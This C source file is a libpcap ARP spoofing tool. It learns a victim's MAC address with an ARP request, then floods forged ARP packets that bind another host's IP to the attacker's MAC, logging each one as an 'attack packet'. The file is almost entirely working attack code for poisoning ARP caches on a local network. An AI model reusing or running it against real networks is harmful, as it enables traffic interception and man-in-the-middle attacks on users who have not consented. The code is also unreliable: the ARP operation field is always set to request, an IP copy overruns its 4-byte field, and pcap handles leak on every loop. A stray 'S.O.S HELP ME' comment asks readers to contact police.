#include "pcap_header.h"

int ARP_Parse(Packet* arp_packet, Target* target)
{
  //printf("Dest Mac : ");
  /*
  for(int i=0;i<6;i++)
  {
    printf(":%02x",arp_packet->arp_header.SourceHardWareAddress[i]);
    target->Target_Mac[i] = arp_packet->arp_header.SourceHardWareAddress[i];
  }
  */
  memcpy(target->Target_Mac, arp_packet->arp_header.SourceHardWareAddress, 6);
  printf("\n");
  return 0;
}

void make_arp_packet(Packet* packet, Target* target, int arp_mode)
{
  if(arp_mode == REQUEST)
  {
    memset(packet->ethernet.dest_mac, 0xff, 6);
	  memcpy(packet->arp_header.SourceProtocolAddress, target->My_IP, 4);
  }
  else if(arp_mode == REPLY)
  {
	  memcpy(packet->ethernet.dest_mac, target->Target_Mac, 6);
	  memcpy(packet->arp_header.SourceProtocolAddress, target->Target_IP, 4);
  }
  memcpy(packet->ethernet.src_mac, target->MyMac, 6);
  //set arp protocol
  packet->ethernet.Protocol = htons(0x806);
  //arp header -> setting
  packet->arp_header.HardWare_AddressType = htons(0x1);

  packet->arp_header.Protocol = htons(0x800);
  packet->arp_header.HardWareAddressLength = 0x6;
  packet->arp_header.ProtocolAddressLength = 0x4;
  packet->arp_header.Operation =htons(0x1);
  //set source mac
  memcpy(packet->arp_header.SourceHardWareAddress, target->MyMac, 6);
  //set target Mac
  memcpy(packet->arp_header.TargetHardWareAddress, target->Target_Mac, 6);
  //set Target IP hardcoding
  memcpy(packet->arp_header.TargetProtocolAddress, target->Sender_IP, 6);
}

int send_arp_packet(Packet* packet, Target* target, int test_mode)
{
  const int packet_size = 42;
  pcap_t* handle = NULL;
  char errbuf[PCAP_ERRBUF_SIZE];
  const char *device = target->wlan_name;
  if((handle = pcap_open_live(device, BUFSIZ, 1, 0, errbuf)) == NULL)
  {
    error_handling("Error pcap open live", true);
  }
  int result=0;
  result = pcap_inject(handle,packet, packet_size);
}
int receive_arp_packet(Packet* packet, Target* target)
{
  int result;
  const char* dev = target->wlan_name;
  char errbuf[PCAP_ERRBUF_SIZE];
  const u_char* network_packet;
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    error_handling("couldn't open device", true);
  }
  while (true) {
    struct pcap_pkthdr* header;
    int res = pcap_next_ex(handle, &header, &network_packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;
    if((result = check_arp_packet(network_packet)) != 0x806){ //arp packet
      continue;
    }
    else{
      memcpy(packet, network_packet, sizeof(Packet));
      break;
    }
  }
  pcap_close(handle);
  return 0;
}
/*
S.O.S : HELP ME! DISTRESS !!! IF you see this writing , plz report close police office.
*/
int check_arp_packet(const u_char* network_packet)
{
  Ethernet* ethernet = (Ethernet*)network_packet;
  return htons(ethernet->Protocol);
}

int Handler(Target* target)
{
  Packet request_packet;
  Packet reply_packet;
  make_arp_packet(&request_packet, target, REQUEST);
  printf("[DEBUG] Success Make Packet\n");
  send_arp_packet(&request_packet, target,REQUEST);
  printf("[DEBUG] Success Send Packet\n");
  receive_arp_packet(&reply_packet, target);
  printf("[DEBUG] Success Receive Packet\n");
  ARP_Parse(&reply_packet, target);
  printf("[DEBUG] Success Parse Packet\n");
  make_arp_packet(&request_packet, target, REPLY);
  printf("[DEBUG] Success make Packet\n");
  while(1){
    send_arp_packet(&request_packet, target, REPLY);
    printf("[DEBUG] Success Send Attack Packet\n");
  }

}
